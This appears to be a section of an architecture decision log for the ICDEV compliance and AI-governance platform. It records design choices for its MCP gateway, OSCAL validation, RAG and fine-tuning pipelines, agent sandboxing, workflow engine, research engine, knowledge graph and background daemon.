- **D301:** Unified MCP gateway (`unified_server.py`) uses declarative tool registry (`tool_registry.py`) with lazy module loading. Existing 19 servers remain independently runnable (backward compat). Registry maps tool name → (module, handler, schema). Handlers imported via `importlib.import_module()` on first call, cached thereafter. 55 new tools for CLI gaps use direct Python import with subprocess fallback (`gap_handlers.py`). All 248 tools inherit D284 auto-instrumentation from `base_server.py`. Reduces `.mcp.json` from 19 entries to 1.
- **D302:** oscal-cli invoked via subprocess (`_run_cli()` pattern). Java detected at load time, cached. Degrades to built-in validation when absent. Config: `args/oscal_tools_config.yaml`
- **D303:** oscal-pydantic is a post-generation validation layer. Does NOT replace dict construction. Skipped via `ImportError` when not installed. MIT license.
- **D304:** Official NIST OSCAL catalog stored in `context/oscal/` (downloaded, not committed — 14MB). ICDEV™ custom catalog (`context/compliance/nist_800_53.json`) preserved as fallback. `OscalCatalogAdapter` normalizes both formats. Priority: official → ICDEV™.
- **D305:** Single orchestrator module (`oscal_tools.py`) composes all three integrations. Each independently optional. 3-layer validation pipeline: structural → pydantic → Metaschema.
- **D306:** `oscal_validation_log` append-only table records every validation attempt (D6 pattern). Validator name, pass/fail, error count, duration tracked per layer.
- **D307:** All 4 AI transparency assessors use BaseAssessor ABC (D116) — ~150-200 LOC each, automatic gate/CLI/crosswalk
- **D308:** Model cards follow Google Model Cards format (open standard, widely adopted in Gov AI community)
- **D309:** System cards are ICDEV™-specific (broader than model cards — cover full agentic system, not just individual models)
- **D310:** Confabulation detector uses deterministic methods only (consistency checks, citation verification) — no LLM-based detection (air-gap safe)
- **D311:** Fairness assessor focuses on compliance documentation evidence, not statistical bias testing (ICDEV™ doesn't train models — it uses them)
- **D312:** AI inventory follows OMB M-25-21 schema for direct government reporting compatibility
- **D313:** GAO evidence builder reuses existing ICDEV™ data (audit_trail, ai_telemetry, XAI, SHAP, provenance) — no new data collection needed
- **D314:** New `AI` data category trigger auto-activates all 4 frameworks + existing NIST AI RMF + ISO 42001 when AI components detected
- **D315:** COSAiS overlay mapping deferred until NIST publishes final specification (anticipated late 2026) — catalog stub in framework_registry.yaml with status: planned
- **D316:** Accountability tables are append-only (D6) except `ai_caio_registry` and `ai_reassessment_schedule` which allow UPDATE (officials change, schedules shift)
- **D317:** Accountability manager is a single coordinator tool (not 13 separate tools) — consolidates gaps into one import with focused functions
- **D318:** AI incident log is separate from `audit_trail` — incidents are AI-specific events requiring corrective action, not generic audit events
- **D319:** Ethics reviews store boolean flags (`opt_out_policy`, `legal_compliance_matrix`, `pre_deployment_review`) for fast assessor checks rather than free-text scanning
- **D320:** Impact assessment stored in `ai_ethics_reviews` with `review_type='impact_assessment'` rather than a separate table — avoids table proliferation
- **D321:** Fairness gate lowered to 25% to be achievable with DB-only checks (no `project_dir` required) — 2 existing + 4 new DB checks = 6/8 = 75% maximum possible
- **D322:** AI governance keyword detection reuses existing `_detect_*_signals()` intake pattern (D119, D125) — deterministic keyword matching from YAML config, no LLM needed
- **D323:** AI governance readiness is the 7th readiness dimension (extends D21 weighted average) — checks 6 governance components against existing Phase 48/49 DB tables
- **D324:** Extension builtins stored in `tools/extensions/builtins/` with numbered Python files (Agent Zero pattern) — auto-loaded by ExtensionManager on init
- **D325:** `chat_message_after` hook activated for governance advisory injection — observational tier, does not block message delivery
- **D326:** Governance sidebar fetches from existing transparency/accountability APIs (no new endpoints) — reuses `/api/ai-transparency/stats` and `/api/ai-accountability/stats`
- **D327:** Advisory messages are non-blocking system messages (advisory-only, not enforcing) — cooldown prevents spamming (default 5 turns)
- **D328:** Single config file (`args/ai_governance_config.yaml`) for all governance integration settings — intake, chat, readiness, auto-trigger
- **D329:** No new database tables — reuses Phase 48/49 tables (`ai_use_case_inventory`, `ai_model_cards`, `ai_oversight_plans`, `ai_ethics_reviews`, `ai_caio_registry`, `ai_reassessment_schedule`) for all governance checks
- **D330:** `ai_governance` security gate is separate from `ai_transparency` and `ai_accountability` gates — governance focuses on cross-cutting intake/chat integration requirements
- **D331:** Code quality metrics are read-only, advisory-only (D110 pattern). Never modifies source files.
- **D332:** `code_quality_metrics` and `runtime_feedback` tables are append-only time-series (D6, D131 pattern).
- **D333:** Python uses `ast.NodeVisitor` (D13); other languages use regex branch-counting (same dispatch as `modular_design_analyzer.py`).
- **D334:** Runtime feedback maps test→source via naming convention. Advisory correlation only.
- **D335:** Code quality signals feed into existing Innovation Engine pipeline (D199-D208). No new pipeline. No autonomous modification.
- **D336:** Pattern learning uses existing +0.1/-0.2 model from `pattern_detector.py`.
- **D337:** Maintainability score = deterministic weighted average: complexity(0.30) + smell_density(0.20) + test_health(0.20) + coupling(0.15) + coverage(0.15).
- **D338:** KSI generator maps ICDEV™ evidence to FedRAMP 20x KSI schemas. Not a BaseAssessor — KSIs are evidence artifacts, not assessment checks. Follows `cssp_evidence_collector.py` pattern.
- **D339:** OWASP ASI assessor uses BaseAssessor ABC (D116). 10 ASI risks map to NIST 800-53 via crosswalk.
- **D340:** FedRAMP authorization packager bundles OSCAL SSP + KSI evidence. Extends `oscal_generator.py`.
- **D341:** SLSA attestation generator extends existing `attestation_manager.py`. Produces SLSA v1.0 provenance from build pipeline evidence.
- **D342:** CycloneDX version upgrade is backward-compatible with `--spec-version` flag (default 1.7, allow 1.4).
- **D343:** Workflow composer uses declarative YAML templates (D26) + `graphlib.TopologicalSorter` (D40).
- **D344:** A2A v0.3 adds `capabilities` to Agent Card and `tasks/sendSubscribe` for streaming. Backward compatible — checks `protocolVersion` field.
- **D345:** MCP OAuth 2.1 reuses existing SaaS auth middleware. Supports offline HMAC token verification for air-gap.
- **D346:** MCP Elicitation allows tools to request user input mid-execution. MCP Tasks wraps long-running tools with create/progress/complete lifecycle.
- **D347:** Evidence collector extends `cssp_evidence_collector.py` pattern to all 14 frameworks. Uses crosswalk engine for multi-framework mapping.
- **D348:** Lineage dashboard joins digital thread + provenance + audit trail + SBOM into unified DAG visualization. Read-only SVG rendering.
- **D349:** EU AI Act classifier uses BaseAssessor ABC. Bridges through ISO 27001 international hub (D111). Optional — triggered only when `eu_market: true`.
- **D350:** Iron Bank metadata generator follows `terraform_generator.py` pattern. Produces `hardening_manifest.yaml` for Platform One Big Bang. Language auto-detection from project directory.
- **D351:** Creative Engine is separate from Innovation Engine — different domain (customer voice vs. technical signals), different scoring (3-dimension vs. 5-dimension), different sources (review sites/forums vs. CVE/package/standards feeds)
- **D352:** Source adapters via function registry dict (D66/web_scanner `SOURCE_SCANNERS` pattern) — add new sources without code changes
- **D353:** Competitor auto-discovery is advisory-only — stores as `status='discovered'`; human must confirm before tracking activates
- **D354:** Pain extraction is deterministic keyword/regex — no LLM needed, air-gap safe, reproducible
- **D355:** 3-dimension scoring: pain_frequency(0.40) + gap_uniqueness(0.35) + effort_to_impact(0.25) — user-specified weights, deterministic weighted average (D21)
- **D356:** Feature specs are template-based — follows `solution_generator.py` pattern, no LLM, reproducible
- **D357:** All Creative Engine tables append-only except `creative_competitors` (allows UPDATE for status transitions discovered→confirmed→archived)
- **D358:** Reuses `_safe_get()`, `_get_db()`, `_now()`, `_audit()` helpers — copy-adapted from `web_scanner.py`
- **D359:** Daemon mode respects quiet hours from config — consistent with `innovation_manager.py`
- **D360:** High-scoring creative signals cross-register to `innovation_signals` — enables Innovation Engine trend detection on creative discoveries

---

## 5. Subsystem-Specific (D-prefixed decisions)

### D-DB — Database & Storage

- **D-DB-20:** PostgreSQL is the primary backend; SQLite retained as lightweight fallback for portable/browser scenarios
- **D-DB-21:** Storage abstraction layer in `tools/db/storage.py` -- all tools use `get_connection()` (backend-agnostic)
- **D-DB-22:** `args/storage_config.yaml` controls backend selection; env vars override YAML (ICDEV_STORAGE_BACKEND, ICDEV_PG_*)
- **D-DB-23:** Placeholder translation (? -> %s) handled transparently by StorageConnection wrapper
- **D-DB-24:** Supabase for marketplace-saas (PostgreSQL + Auth + RLS + Realtime)
- **D-DB-25:** Alembic for PostgreSQL schema versioning (replaces table-recreation pattern)
- **D-DB-26:** Extended SQL translation layer (4 new rules): `LIKE` → `ILIKE` for case-insensitive matching, `GROUP_CONCAT` → `string_agg()`, `GLOB` → `~` regex, `last_insert_rowid()` → `lastval()`. All 13 translation rules in `translate_sql()`.
- **D-DB-27:** Eliminated 8 direct `SELECT last_insert_rowid()` SQL calls — replaced with `cursor.lastrowid` property (cross-DB via StorageCursor wrapper).
- **D-DB-28:** Migrated 8 production tools from direct `sqlite3.connect()` to `get_connection()` — ensures all SQL goes through the translation layer. Remaining direct calls are infrastructure-only (init, migration, backup, code generators).

### D-SYNC — File Sync

- **D-SYNC-1:** `SyncTargetProvider` ABC with 3 implementations: Local (stdlib), SFTP (paramiko + subprocess ssh fallback), Cloud (wraps existing `StorageProvider`)
- **D-SYNC-2:** SHA-256 content hash for change detection. Fast-skip: if mtime+size unchanged vs cached state, skip expensive hash
- **D-SYNC-3:** Block-level hashing for files >4MiB (128KiB blocks). Full-file transfer for remote targets (S3/SFTP lack block-level write)
- **D-SYNC-4:** `.syncignore` parsed via stdlib `fnmatch` (gitignore-subset patterns)
- **D-SYNC-5:** Conflict strategies configurable per job: `last_write_wins`, `rename_both`, `source_wins`, `skip`
- **D-SYNC-6:** `ThreadPoolExecutor` for parallel transfers (D-SC-1 pattern), configurable `max_workers`
- **D-SYNC-7:** `sync_log` is append-only (NIST AU). `sync_jobs`/`sync_state`/`sync_conflicts` allow UPDATE
- **D-SYNC-8:** File watching via optional `watchdog`; periodic `os.walk` scan as fallback
- **D-SYNC-9:** Daemon mode with quiet hours (D359 pattern)
- **D-SYNC-10:** Bandwidth throttle via `time.sleep()` between chunks (zero deps)
- **D-SYNC-11:** `.syncignore` auto-excludes `.git/`, `__pycache__/`, `.env` by default
- **D-SYNC-12:** Provider abstraction allows mixed-provider sync (e.g., local→S3, SFTP→local)

### D-RAG — Universal RAG Subsystem

- **D-RAG-1:** VectorStoreProvider ABC with SQLite/ChromaDB/FAISS (D66 pattern). SQLite always available, others graceful ImportError
- **D-RAG-2:** RAG context injected into system prompt of `_draft_request()`, not user message. Claude reviews draft without raw chunks
- **D-RAG-3:** Two-stage retrieval: vector top-50 → qwen3 re-rank to top-5. Re-ranking is scanner_function (qwen3 only)
- **D-RAG-4:** Adaptive chunking: <500 tok whole, >2000 tok overlap. Deterministic, no LLM needed, air-gap safe
- **D-RAG-5:** Content hash (SHA-256) dedup on ingest. Skips re-embedding unchanged content
- **D-RAG-6:** Tiered retention: hot(30d)/warm(365d,float16)/cold(archive). Originals always preserved in source tables
- **D-RAG-7:** Multi-tenant isolation via namespacing. Mirrors D60 SaaS isolation
- **D-RAG-8:** Full PROV-AGENT provenance chain per retrieval. NIST AU-3 compliant
- **D-RAG-9:** Real-time via extension hooks (D261) + batch sweep. Hybrid ingestion
- **D-RAG-10:** Embeddings via existing `get_embedding_provider()` → Ollama nomic-embed-text. No new embedding infra
- **D-RAG-11:** retrieval_log and ingestion_log append-only (D6). Added to APPEND_ONLY_TABLES
- **D-RAG-12:** BM25 boost reuses `hybrid_search.py`, time-decay reuses `time_decay.py`. Zero code duplication
- **D-RAG-13:** Child apps get RAG via capability flag. 3-tier: local-only, parent-federated (A2A), or hybrid
- **D-RAG-14:** Parent RAG queries from children logged with `agent_id="child:{child_id}"` for audit

### D-FT — Fine-Tuning

- **D-FT-1:** `FineTuneProvider` ABC (D66 pattern) with 4 implementations: `UnslothLocalProvider`, `OpenAIFineTuneProvider`, `BedrockFineTuneProvider`, `AzureOpenAIFineTuneProvider`. Graceful `ImportError` on missing SDKs
- **D-FT-2:** Unsloth as sole local QLoRA engine (MIT license, air-gap safe). Subprocess invocation. GGUF export via `save_pretrained_gguf()` with Q4_K_M
- **D-FT-3:** Training job events append-only (`ft_training_job_events`, `ft_promotion_log`). Job/model tables allow UPDATE for status fields
- **D-FT-4:** CUI boundary enforcement — cloud fine-tuning blocked if `project.classification > cloud_max_classification`
- **D-FT-5:** GGUF export via Unsloth with Q4_K_M quantization. Registered with Ollama via `ollama create`. Naming: `{app}-{purpose}-v{version}`
- **D-FT-6:** Fine-tuned model slots into two-tier via `ft_active_models` table lookup in `router.py`. Additive runtime override — does NOT modify `llm_config.yaml`
- **D-FT-7:** Multi-version coexistence via Ollama model tags. Only one "active" per function at a time
- **D-FT-8:** GPU auto-detection: `torch.cuda` → `nvidia-smi` subprocess → CPU fallback. Training requires GPU; serving via Ollama supports CPU
- **D-FT-9:** Datasets append-only versioned. Content-hashed snapshots (SHA-256)
- **D-FT-10:** Auto-generate Q&A training pairs from RAG chunks via qwen3 (scanner_function). Pairs require human review
- **D-FT-11:** Document extraction reuses RAG PDF pipeline (`pdf_provider.py`). Word docs via `python-docx`
- **D-FT-12:** Dashboard labeling UI: quality/compliance/relevance scores (1-5), batch approve/reject with keyboard shortcuts
- **D-FT-13:** Hyperparameter search: grid/random over LoRA rank, learning rate, epochs, batch size. Best by eval score
- **D-FT-14:** Pure Python BLEU/ROUGE-L/perplexity scoring. No external ML libraries required (air-gap safe)
- **D-FT-15:** A/B evaluation: same test set through two models, paired t-test (stdlib `statistics`)
- **D-FT-16:** Auto-promotion if BLEU >= 0.30 AND ROUGE-L >= 0.40 AND perplexity improvement >= 10%. All transitions in `ft_promotion_log`
- **D-FT-17:** Auto-retrain when `new_examples >= threshold` (default 50). Heartbeat daemon check
- **D-FT-18:** LoRA adapters as marketplace asset type (`lora_adapter`). 10-gate pipeline + training data provenance gate
- **D-FT-19:** Child apps inherit parent's promoted adapter files. `child_app_generator.py` scaffolds `tools/finetune/` when enabled
- **D-FT-20:** Cloud providers: OpenAI (`/v1/fine_tuning/jobs`), Bedrock (`create_model_customization_job`), Azure OpenAI (`/fine_tuning/jobs`). Long-running poll
- **D-FT-21:** Multi-GPU via `accelerate` library prefix to Unsloth subprocess
- **D-FT-22:** Full PROV-AGENT provenance chain: source document → RAG chunk → training pair → dataset → training job → LoRA adapter → active model

### D-VL — Verification Loop (LeanStral-adapted)

- **D-VL-1:** Compiler-in-the-loop verification generalizes D255 to all 6 languages — iterative verify→LLM repair→re-verify loop adapted from LeanStral (Mistral AI, 2026-03-16). Config: `args/verify_loop_config.yaml`
- **D-VL-2:** Per-language verifier stacks are declarative YAML (D26 pattern) — add languages/tools without code changes
- **D-VL-3:** Air-gap safe — repair uses local Ollama models (`qwen3-local`) when `ICDEV_AIR_GAPPED=true`; cloud models (LeanStral, Claude) optional
- **D-VL-4:** `verify_loop_runs` table is append-only (NIST AU, D6 pattern)
- **D-VL-5:** Verifiers classified as blocking (syntax, type check) vs non-blocking (lint, SAST) — blocking failures stop the pipeline
- **D-VL-6:** Formal verification gate uses deterministic checks (SQL injection regex, dangerous patterns, invariant density, input validation AST) — no LLM required. Property-based test generation via hypothesis specs (advisory only)
- **D-VL-7:** LSP-over-MCP exposes compiler intelligence to AI agents via MCP (adapted from LeanStral's `lean-lsp-mcp`). 100% air-gap safe — all LSP servers run locally
- **D-VL-8:** Python (pylsp/pyright) first-class, other 5 languages supported via direct tool invocation fallback
- **D-VL-9:** GovEval benchmark — 7-dimension domain-specific evaluation for Gov/DoD compliance quality (SSP completeness, control accuracy, CUI consistency, SBOM quality, gate pass rate, artifact currency, crosswalk cascade). Inspired by LeanStral's FLTEval
- **D-VL-10:** GovEval scoring is deterministic (D21 weighted average, no LLM required). Optional LLM-as-judge for subjective quality
- **D-VL-11:** `formal_verification_results` and `goveval_results` tables are append-only (NIST AU, D6 pattern)
- **D-VL-12:** Mistral/LeanStral models added to LLM router as `openai_compatible` provider — cloud via `api.mistral.ai/v1` (requires `MISTRAL_API_KEY`), self-hosted via vLLM (`MISTRAL_VLLM_BASE_URL`). LeanStral: 119B sparse MoE, 6.5B active/token, Apache 2.0

### D-BT — Bayesian Teaching Intelligence

- **D-BT-1:** Information gain via Shannon entropy + KL divergence (deterministic, stdlib-only, air-gap safe)
- **D-BT-2:** 4-dimension scoring: posterior_shift(0.35) + discriminability(0.25) + diversity(0.20) + complexity_match(0.20)
- **D-BT-3:** Teaching dimension via greedy set-cover (Goldman & Kearns 1995)
- **D-BT-4:** SmartEncoding maps string tags to compact integer IDs for efficient token usage
- **D-BT-5:** Compliance ordering uses NIST control dependency graph for optimal teaching sequence
- **D-BT-6:** bayesian_teaching_scores is append-only (NIST AU, D6 pattern)

### D-NC — NemoClaw Agent Sandboxing

- **D-NC-1:** Credential broker isolates API keys per agent function with auto-revoking scoped tokens (TTL-capped, SHA-256 hashed)
- **D-NC-2:** Egress policies are deny-by-default per agent role, generating K8s NetworkPolicy manifests
- **D-NC-3:** Blueprint verifier computes recursive SHA-256 digests for genome/marketplace/child integrity verification
- **D-NC-4:** Sandbox scorer adds 8th dimension to capability evaluation (isolation posture: broker, egress, blueprint, propagation)
- **D-NC-5:** Propagation verifier checks digest + DB schema + health endpoint + CUI markings after capability distribution
- **D-NC-6:** Egress monitor tracks child network calls and evaluates against parent-defined egress policies

### D-SEC — Security Enforcement

- **D-SEC-10:** Container-isolated code execution via llm-sandbox (Docker/Podman/K8s) with resource limits, network isolation, and append-only audit logging (Phase 71)
- **D-SEC-11:** LLM Sandbox integration across 5 entry points: CodeLens test pipeline (step 2.5), CI/CD contributor PR verification (GitLab + GitHub), OpenClaw bridge import (Gate 9 upgrade + Gate 9b full execution), Marketplace pre-install verification, Genesis Evolve mutation safety with confidence penalty. All with graceful degradation when Docker unavailable (Phase 72)

### D-WF — Workflow Discipline Engine

- **D-WF-1:** PLAN-APPLY-UNIFY lifecycle with 6-state machine (PLANNING→PLANNED→APPLYING→APPLIED→UNIFYING→CLOSED/ABANDONED)
- **D-WF-2:** Next action uses 5-dimension weighted priority (staleness 0.30, compliance_gap 0.25, security_risk 0.20, loop_state 0.15, handoff_age 0.10)
- **D-WF-3:** Process verifier queries audit_trail for required event types during APPLY phase — deterministic, no LLM
- **D-WF-4:** Handoff generator creates markdown documents for cross-session context transfer
- **D-WF-5:** Reconciler tracks planned-vs-actual with deviation severity classification (minor/moderate/major)
- **D-WF-6:** workflow_loops/acceptance_criteria allow UPDATE (state transitions); workflow_reconciliations/handoffs are append-only (D6)
- **D-WF-7:** Loop abandonment requires explicit reason (NIST AU-3 event detail traceability)
- **D-WF-8:** Coherence Engine — 7 deterministic checks (schema_code, config_code, signature_call, fixture_schema, manifest, append_only, import_usage) with 2-tier auto-fix (auto: imports/append-only, suggest: schema/config/fixture). Wired into: workflow UNIFY reconciler, Genesis audit reflex, GKP promotion gate, CI/CD SDLC pipeline, marketplace publish gate, test orchestrator, heartbeat daemon, production audit. Child apps inherit via DIRECTORY_TREE. LLM-agnostic (stdlib only, air-gap safe)

### D-CPMP — Contract Performance Management

- **D-CPMP-1:** All CPMP tables prefixed `cpmp_` — namespace isolation from existing govcon/proposal tables
- **D-CPMP-2:** EVM uses deterministic formulas, Monte Carlo via stdlib `random` (D22) — air-gap safe, no numpy/scipy
- **D-CPMP-3:** CPARS prediction uses deterministic weighted average (D21) — reproducible, not probabilistic; ML upgrade path later
- **D-CPMP-4:** COR portal is read-only routes on same Flask app — reuses existing auth; role-based access sufficient
- **D-CPMP-5:** CDRL generator dispatches to existing ICDEV™ tools — reuse ssp_generator, sbom_generator, stig_checker, etc.
- **D-CPMP-6:** SAM.gov Contract Awards follows sam_scanner.py pattern (D366) — consistent rate limiting, content hash dedup
- **D-CPMP-7:** Negative events append-only (D6) — NIST AU-2; corrective action status tracked on record
- **D-CPMP-8:** Contract health is deterministic weighted average (D21) — configurable weights in YAML (D26)
- **D-CPMP-9:** Transition bridge is explicit API call, not automatic — human confirms contract creation from won proposal
- **D-CPMP-10:** `idiq_contract_id` self-reference for IDIQ/TO hierarchy — task orders under IDIQ vehicles without separate table

### D-DISP — Dispatcher Mode

- **D-DISP-1:** Dispatcher-only orchestrator mode restricts orchestrator to delegation tools (dispatch, route, status, mailbox) and blocks domain tools (scaffold, generate_code, ssp_generate, etc.) — enforces FORGE separation of concerns, per-project DB overrides

### D-PC — Prompt Chains

- **D-PC-1:** Declarative YAML prompt chains (D26 pattern) — sequential LLM-to-LLM reasoning with $INPUT/$ORIGINAL/$STEP{id} variable substitution, per-step agent routing via LLMRouter
- **D-PC-2:** Prompt chains use LLMRouter.invoke() for model invocation, not A2A agent dispatch — chains are reasoning pipelines, not agent orchestration
- **D-PC-3:** Sequential execution only for prompt chains — DAG parallelism handled by team_orchestrator.py (D40)

### D-ORCH — Orchestration

- **D-ORCH-5:** Session purpose declaration for NIST AU-3 event detail traceability — purpose injected into agent system prompts as guardrail
- **D-ORCH-7:** Async result injection via high-priority mailbox messages (priority 9) — fire-and-forget pattern for background agent results
- **D-ORCH-8:** Tiered file access control — three tiers (zero_access, read_only, no_delete) with glob-style pattern matching in pre_tool_use.py hook

### D-CHILD — Child App Generation

- **D-CHILD-1:** Enterprise-grade child apps with 10-12 agents, 21 goals — children inherit all core ICDEV™ components (TDD, BDD, MBSE, DevSecOps/ZTA, AI Security, Observability, RICOAS, Code Intelligence)
- **D-CHILD-2:** `.claude/` directory is a first-class generation artifact — hooks, commands, skills, E2E specs copied from parent with parent-only exclusions
- **D-CHILD-3:** `PARENT_ONLY_DIRS/COMMANDS/SKILLS` exclusion lists prevent internal tools from leaking to child apps (SaaS, GovProposal, Creative Engine, Innovation Engine, Marketplace, Translation, Gateway)
- **D-CHILD-4:** Full 40+ page dashboard replaces minimal stub in child apps — GovProposal/CPMP/GovCon routes stripped via `_strip_govcon_from_dashboard()`
- **D-CHILD-5:** Apache-2.0 license for all deliveries (open-source and government) — single-license model adopted 2026-04-19 (commercial tier removed)
- **D-CHILD-6:** GovProposal/CPMP/GovCon routes feature-flag isolated via `ICDEV_GOVCON_ENABLED` env var — child apps and non-govcon deployments exclude these modules cleanly

### D-RES — Industry Research Engine

- **D-RES-1:** Session-based (not daemon). Bounded lifecycle per vertical research
- **D-RES-2:** Vertical configs are declarative JSON in `context/research/verticals/*.json` — add new verticals without code changes
- **D-RES-3:** Source adapters via `SOURCE_SCANNERS` function registry dict (D352 pattern)
- **D-RES-4:** 6-dimension challenge scoring (D21 deterministic weighted average)
- **D-RES-5:** All `research_*` tables append-only (D6) except `research_sessions` and `research_verticals` (allow UPDATE for status)
- **D-RES-6:** Regulatory body mapping uses `context/research/regulatory_registry.json` with crosswalk hooks
- **D-RES-7:** ICDEV™ capability mapping reuses `icdev_capability_catalog.json` with keyword-overlap algorithm
- **D-RES-8:** Build/buy/partner is a separate pipeline stage producing scored decision matrix per challenge
- **D-RES-9:** Dossier is template-based Markdown (D356, no LLM, air-gap safe)
- **D-RES-10:** Dossier feeds into child app fitness via `research_session_id` field. HITL approval required
- **D-RES-11:** Cross-registration to Innovation Engine (score >= 0.70) and Creative Engine (score >= 0.65) via D360 pattern
- **D-RES-12:** Air-gapped mode degrades to manual entries + uploaded documents
- **D-RES-13:** Research Engine is parent-only (not copied to child apps, added to `PARENT_ONLY_DIRS`)
- **D-RES-14:** YouTube is a 9th source stream (`source='video'`) with 3 source_types: `youtube_search`, `youtube_manual`, `youtube_channel`. Disabled by default, opt-in per deployment
- **D-RES-15:** YouTube Data API v3 requires `YOUTUBE_API_KEY` env var. Degrades gracefully without key to manual-only mode. Transcript extraction via `youtube-transcript-api` (no API key needed)
- **D-RES-16:** YouTube transcripts processed via two-tier LLM: qwen3 summarizes transcript → Claude extracts key signals. Metadata-only fallback when no transcripts available
- **D-RES-17:** FORECAST is the 9th pipeline stage: SCOPE→...→SYNTHESIZE→FORECAST→DOSSIER. Maps to status `synthesizing`. Generates LLM-assisted predictions via two-tier routing
- **D-RES-18:** Cross-engine aggregation: FORECAST queries `innovation_trends`, `innovation_signals`, `creative_pain_points`, `creative_feature_gaps` alongside research data
- **D-RES-19:** Each prediction has confidence (0-1), surprise_score (0-1), composite_rank = confidence × surprise_score. Top 5 returned sorted by composite_rank
- **D-RES-20:** `research_forecasts` table (append-only, D6) stores predictions with `outcome` field for future accuracy tracking
- **D-RES-21:** Dossier gains "Predictive Analysis & Surprise Recommendations" section between Recommendations and Appendix

### D-KARL — Knowledge-Augmented Retrieval & Learning

- **D-KARL-1:** Per-query-type GraphRAG scoring profiles (compliance, exploratory, entity_search, synthesis) with auto-detection from query text
- **D-KARL-2:** Self-directed context compression via scanner-tier LLM (qwen3.5, zero Claude tokens) — compresses verbose GraphRAG neighborhood context before downstream consumption
- **D-KARL-3:** Parallel multi-strategy retrieval (GraphRAG + corrective RAG + source registry) via ThreadPoolExecutor with generative aggregation — scanner-tier LLM synthesizes unified context from N independent retrieval paths
- **D-KARL-4:** Pass-rate filtered training pair generation — Goldilocks difficulty calibration (pairs that are neither too easy nor too hard for the model)
- **D-KARL-5:** Automated RAG-to-FT pipeline — detect new RAG chunks since last run, generate Q&A pairs via pair_generator, quality-filter with Bayesian ranking, auto-approve above threshold (0.8), check retrain trigger. Tracked in `ft_pipeline_runs` (append-only). Configurable source types, schedule, and max pairs per run via `args/finetune_config.yaml`.
- **D-KARL-6:** KG community-based fine-tuning pair generation — three deterministic strategies: (1) entity-relationship pairs from edge templates, (2) community cluster pairs from BFS components, (3) compliance crosswalk pairs from control↔standard edges. Template-based (air-gap safe), optional scanner-tier refinement. Deduplicates by content hash before storage.
- **D-KARL-7:** Entity embedding and centrality enrichment — compute degree + betweenness centrality (weighted average 0.6/0.4, BFS-based, deterministic) and persist to `kg_nodes.centrality`. Compute entity embeddings via nomic-embed-text (Ollama) and persist to `kg_nodes.embedding` BLOB. Enables semantic node search in GraphRAG. Config in `args/knowledge_graph_config.yaml`.
- **D-KARL-8:** RAG evaluation feedback loop with quality-triggered retraining — monitor RAG metrics (NDCG, MRR, faithfulness) against configurable thresholds, record snapshots in `ft_quality_snapshots` (append-only), count consecutive failures, recommend retrain when N consecutive failures detected.
- **D-KARL-9:** GraphRAG semantic search — cosine similarity on `kg_nodes.embedding` BLOB (nomic-embed-text 768-dim float32) augments keyword LIKE matching. Additive 0.2x embedding similarity scoring bonus. Graceful degradation when Ollama unavailable or embeddings not populated. Uses `urllib.request` for embedding query (no external deps).
- **D-KARL-10:** Compliance crosswalk as knowledge graph — models NIST 800-53 controls, control families, and frameworks (FedRAMP, CMMC, NIST 800-171, CJIS, HIPAA, etc.) as `kg_nodes` with `satisfies`, `belongs_to`, and `overlaps_with` edges. Deterministic content-hash IDs for idempotent rebuilds. BFS crosswalk path traversal and per-framework coverage queries.
- **D-KARL-11:** Hyperparameter search orchestrator — grid/random search over LoRA hyperparameters (rank, learning rate, epochs, batch size). Non-blocking design: `run_next_trial()` queues training job, external scheduler checks completion. Config-driven from `args/finetune_config.yaml` `hyperparam_search` section. DB tables: `ft_hp_searches`, `ft_hp_trials`.
- **D-KARL-12:** KG insights dashboard integration — dedicated Insights tab with parallel API calls for bridge gaps, orphan nodes, and research questions. Compliance KG tab with one-click crosswalk graph builder. Tab-based UI with Search, Graphs, Insights, Compliance KG, and Query Log panels.
- **D-KARL-13:** Entity disambiguation — find duplicate nodes via exact/normalized label matching and embedding cosine similarity. Merge entities (re-point edges, merge properties, add aliases). Resolve ambiguous labels with context-aware scoring. Deterministic, no LLM required.
- **D-KARL-14:** Cross-project graph federation — federated search across multiple project graphs with dedup and source attribution. Shared entity discovery between projects. Virtual federated views (metadata-only, no data copy). Cross-project compliance coverage matrix for multi-boundary programs.
- **D-KARL-15:** Temporal reasoning on KG — time-range queries, graph evolution time series (day/week/month intervals), recent changes summary, stale entity detection, and temporal diff between two dates. All queries use `created_at` timestamps with ISO-8601 format.

### D-FS-TIER — Forge Studio Blueprint Tiering

- **D-FS-TIER-1:** Deterministic 12-signal tier classifier (regex, no LLM) — threshold >= 3 routes to parent ICDEV™ handoff
- **D-FS-TIER-2:** ForgeBlueprint manifest with 31-column DB table — portable JSON spec for app design, requirements, and handoff tracking
- **D-FS-TIER-3:** Parent ICDEV™ HTTP client uses stdlib urllib (air-gap safe) with queued retry when parent unreachable
- **D-FS-TIER-4:** Build tracker orchestrates full pipeline: classify → route → build (local eject) or submit (parent handoff) → track

### D-DH — DocHub

- **D-DH-1:** Scanner-tier deterministic generation (zero Claude tokens). Templates + data aggregation only. Optional LLM enhancement via two-tier router.
- **D-DH-2:** Document versions use monotonic integer (1, 2, 3...) with SHA-256 content hash for integrity
- **D-DH-3:** Section-level diffing (not line-level) — aligns with structured document templates
- **D-DH-4:** Health score uses weighted composite: freshness=0.35, completeness=0.40, gaps=0.25 (same pattern as D-INV-29 scorecard)
- **D-DH-5:** BYOS scanner reuses existing detection patterns from sbom_generator.py and code_analyzer.py
- **D-DH-6:** Enrichment cache with configurable TTL — graceful degradation in air-gapped mode
- **D-DH-7:** Multi-tenant via tenant_id column — future-proofed for multi-org without schema change
- **D-DH-8:** Export delegates to existing tools (oscal_generator, xacta_export, emass_export) where possible
- **D-DH-9:** All dh_ tables are append-only (new version = new row, status change on old row) — NIST AU compliant
- **D-DH-10:** Profile definitions are JSON in context/ (FORGE context layer), not hardcoded in tools
- **D-DH-11:** Module-level docs with independent health scores, rolling up to parent app
- **D-DH-12:** Portfolio aggregate uses weighted average by app criticality
- **D-DH-13:** Imported artifacts stored as-is with format detection (SPDX, CycloneDX, PDF, OSCAL)
- **D-DH-14:** Provenance tracks origin_project, origin_version, current_version, drift_status
- **D-DH-15:** Dependency graph uses adjacency list (matches D27 pattern)

### D-GEN — Genesis Daemon

- **D-GEN-1:** Single daemon process, 12 threads (one per Reflex) — simpler than 12 daemons
- **D-GEN-2:** Scanner-tier LLM only (qwen3.5 local, unlimited) — zero Claude cost for autonomous ops
- **D-GEN-3:** Knowledge flows via GKP JSON artifacts, never git merge — decouples experimental code from production
- **D-GEN-4:** Promoter is the only gateway from v2.0 → v1.x — single point of validation and audit
- **D-GEN-5:** v2-genesis rebases on main weekly — stays current without polluting main
